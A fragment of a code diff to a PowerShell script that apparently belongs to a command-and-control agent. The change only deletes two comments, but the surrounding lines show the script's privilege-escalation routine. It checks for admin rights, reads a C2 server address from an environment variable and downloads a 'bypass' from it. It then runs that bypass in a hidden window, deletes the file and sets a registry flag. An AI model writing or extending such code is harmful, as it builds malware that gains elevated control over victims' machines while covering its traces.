@@ -81,7 +81,6 @@ $alreadyElevated = Test-Path $regFlag
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $alreadyElevated -and -not $isAdmin) {
-    # The agent must set C2BaseURL; if not, we fail intentionally
     $c2Base = $env:C2BaseURL
     if (-not $c2Base) {
         Write-Output "❌ C2BaseURL not set. Cannot download bypass."
@@ -100,7 +99,6 @@ if (-not $alreadyElevated -and -not $isAdmin) {
         Start-Process -WindowStyle Hidden -FilePath $bypassPath -ArgumentList $tempAgent
         Start-Sleep -Seconds 5
         Remove-Item $bypassPath -Force -ErrorAction SilentlyContinue
-        # Mark as attempted
         New-Item -Path $regFlag -Force | Out-Null
         Write-Output "Elevation attempted (check for elevated agent)."
     } catch {
